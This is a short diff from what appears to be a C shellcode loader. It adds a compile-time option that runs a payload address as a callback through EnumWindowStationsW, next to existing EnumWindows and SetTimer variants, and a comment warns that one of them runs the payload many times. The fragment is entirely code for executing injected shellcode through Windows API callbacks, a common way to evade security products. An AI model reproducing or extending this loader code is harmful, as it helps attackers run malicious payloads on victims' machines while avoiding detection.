@@ -170,6 +170,8 @@ int entry(int argc, char** argv) {
 #elifdef EXEC_ENUMWINDOWS
     // NOTE: dangerous, runs payload NUMEROUS times
     EnumWindows((WNDENUMPROC)scAddr, 0);
+#elifdef EXEC_ENUMWINDOWSTATIONSW
+    EnumWindowStationsW((WINSTAENUMPROCW)scAddr, 0);
 #elifdef EXEC_SETTIMER
     MSG msg;
     SetTimer(0, 0, 0, (TIMERPROC)scAddr);
